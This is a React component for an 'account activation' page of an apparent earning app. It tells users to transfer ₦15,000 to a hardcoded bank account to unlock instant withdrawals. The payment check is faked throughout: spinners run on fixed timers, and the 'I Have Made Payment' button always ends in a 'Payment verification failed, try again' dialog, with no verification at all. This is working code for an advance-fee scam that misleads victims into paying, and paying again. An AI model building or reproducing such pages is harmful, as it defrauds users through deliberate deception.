import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Copy, Banknote, User2, Wallet } from "lucide-react";
import { useAuth } from "@/contexts/AuthContext";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";

const ActivateAccount: React.FC = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [isProcessing, setIsProcessing] = useState(false);
  const [showPaymentDetails, setShowPaymentDetails] = useState(false);
  const [isPaymentProcessing, setIsPaymentProcessing] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);
  const [buttonText, setButtonText] = useState("I Have Made Payment");

  const accountDetails = {
    bankName: "Stella MFB",
    accountNumber: "1100892582",
    accountName: "Noble earn (Agent)",
    amount: "₦15,000"
  };

  const handleBack = () => {
    navigate("/dashboard");
  };

  const handleActivateNow = () => {
    setIsProcessing(true);
    
    // 6 seconds loading
    setTimeout(() => {
      setIsProcessing(false);
      setShowPaymentDetails(true);
    }, 6000);
  };

  const handleCopyClick = (text: string, label: string) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        toast.success(`${label} copied!`);
      })
      .catch(() => {
        toast.error("Failed to copy");
      });
  };

  const handlePaymentConfirmation = () => {
    setIsPaymentProcessing(true);
    setButtonText("Pending....");
    
    // After 9 seconds, show error dialog
    setTimeout(() => {
      setIsPaymentProcessing(false);
      setShowErrorDialog(true);
    }, 9000);
  };

  const handleTryAgain = () => {
    setShowErrorDialog(false);
    setButtonText("I Have Made Payment");
  };

  if (isProcessing) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center">
        <div className="w-16 h-16 border-4 border-green-800 border-t-transparent rounded-full animate-spin mb-4"></div>
        <p className="text-lg text-green-800 font-medium">Processing activation...</p>
      </div>
    );
  }

  if (showPaymentDetails) {
    return (
      <div className="min-h-screen bg-white">
        <div className="flex items-center p-4 border-b">
          <button onClick={handleBack} className="mr-3">
            <ArrowLeft size={20} className="text-green-800" />
          </button>
          <h1 className="text-lg font-bold text-green-800">Account Activation Payment</h1>
        </div>

        <div className="p-6">
          <div className="text-center mb-8">
            <h2 className="text-2xl font-bold text-green-800 mb-2">Make Payment for Activation Code</h2>
            <p className="text-gray-600">Transfer to the account below to get your activation code</p>
          </div>

          <div className="bg-gray-50 rounded-lg overflow-hidden text-sm mb-6">
            <div className="p-4 flex justify-between items-center">
              <div className="flex-1">
                <div className="flex items-center">
                  <div className="bg-gray-100 p-2 rounded-md mr-3">
                    <Banknote size={24} className="text-green-800" />
                  </div>
                  <div>
                    <p className="text-gray-500 text-sm">Bank Name</p>
                    <p className="font-bold text-green-800 text-lg">{accountDetails.bankName}</p>
                  </div>
                </div>
              </div>
              <div className="flex items-center text-blue-600">
                <span className="bg-green-100 px-3 py-1 rounded-md text-green-600 text-sm">Active</span>
              </div>
            </div>
            
            <div className="border-t p-4 flex justify-between items-center">
              <div className="flex items-center">
                <div className="bg-gray-200 p-2 rounded-md mr-3 w-10 h-10 flex items-center justify-center">
                  <span className="font-mono text-sm">123</span>
                </div>
                <div>
                  <p className="text-gray-500 text-sm">Account Number</p>
                  <p className="font-bold text-gray-800 text-lg">{accountDetails.accountNumber}</p>
                </div>
              </div>
              <Button 
                variant="outline" 
                size="sm"
                className="bg-green-800 text-white hover:bg-green-700"
                onClick={() => handleCopyClick(accountDetails.accountNumber, "Account number")}
              >
                <Copy size={16} className="mr-2" /> Copy
              </Button>
            </div>
            
            <div className="border-t p-4 flex justify-between items-center">
              <div className="flex items-center">
                <div className="bg-gray-200 p-2 rounded-md mr-3 w-10 h-10 flex items-center justify-center">
                  <User2 size={20} className="text-gray-600" />
                </div>
                <div>
                  <p className="text-gray-500 text-sm">Account Name</p>
                  <p className="font-bold text-gray-800 text-lg">{accountDetails.accountName}</p>
                </div>
              </div>
            </div>
            
            <div className="border-t p-4 flex justify-between items-center">
              <div className="flex items-center">
                <div className="bg-gray-200 p-2 rounded-md mr-3 w-10 h-10 flex items-center justify-center">
                  <Wallet size={20} className="text-blue-600" />
                </div>
                <div>
                  <p className="text-gray-500 text-sm">Amount</p>
                  <p className="font-bold text-green-800 text-lg">{accountDetails.amount}</p>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-gray-100 p-4 rounded-lg mb-6">
            <p className="text-gray-700 text-sm">
              Hi, {user?.firstName || "User"}
            </p>
            <p className="text-gray-700 text-sm mt-2">
              Make A One Time Payment In Bank Details Above To Activate Your Account And Withdraw Instantly
            </p>
          </div>

          <button
            onClick={handlePaymentConfirmation}
            className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
            disabled={isPaymentProcessing}
          >
            {buttonText}
          </button>
        </div>

        {/* Account Activation Processing Dialog */}
        <Dialog open={isPaymentProcessing} onOpenChange={setIsPaymentProcessing}>
          <DialogContent className="sm:max-w-md p-0 gap-0">
            <div className="p-8 text-center">
              <div className="w-16 h-16 border-4 border-green-800 border-t-transparent rounded-full animate-spin mb-6 mx-auto"></div>
              <h2 className="text-xl font-bold mb-4">Account activation in progress</h2>
              <p className="text-gray-500">Please wait while we process your activation...</p>
            </div>
          </DialogContent>
        </Dialog>
        
        {/* Payment Error Dialog */}
        <Dialog open={showErrorDialog} onOpenChange={setShowErrorDialog}>
          <DialogContent className="sm:max-w-md p-0 gap-0">
            <div className="p-6">
              <div className="flex flex-col items-center mb-4">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 5C8.13401 5 5 8.13401 5 12C5 15.866 8.13401 19 12 19C15.866 19 19 15.866 19 12C19 8.13401 15.866 5 12 5Z" stroke="#EF4444" strokeWidth="2" />
                    <path d="M9 12L15 12" stroke="#EF4444" strokeWidth="2" strokeLinecap="round" />
                  </svg>
                </div>
                <h2 className="text-xl font-bold text-center">Payment Not Confirmed</h2>
              </div>
              <p className="text-center mb-6">Payment verification failed. Please try again.</p>
              <button
                onClick={handleTryAgain}
                className="w-full bg-white text-green-800 py-3 border border-green-800 font-bold rounded-md"
              >
                TRY AGAIN
              </button>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="flex items-center p-4 border-b">
        <button onClick={handleBack} className="mr-3">
          <ArrowLeft size={20} className="text-green-800" />
        </button>
        <h1 className="text-lg font-bold text-green-800">Account Activation</h1>
      </div>

      <div className="p-6">
        <div className="text-center mb-8">
          <h2 className="text-2xl font-bold text-green-800 mb-2">Activate Your Account</h2>
          <p className="text-gray-600">Review your details and activate your account</p>
        </div>

        <div className="bg-gray-50 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-4">Account Details</h3>
          
          <div className="space-y-3">
            <div className="flex justify-between">
              <span className="text-gray-600">First Name:</span>
              <span className="font-medium">{user?.firstName}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Last Name:</span>
              <span className="font-medium">{user?.lastName}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Email:</span>
              <span className="font-medium">{user?.email}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Account ID:</span>
              <span className="font-medium">{user?.id}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Status:</span>
              <span className="text-red-500 font-medium">Not Activated</span>
            </div>
          </div>
        </div>

        <button
          onClick={handleActivateNow}
          className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
        >
          Activate Now
        </button>
      </div>
    </div>
  );
};

export default ActivateAccount;
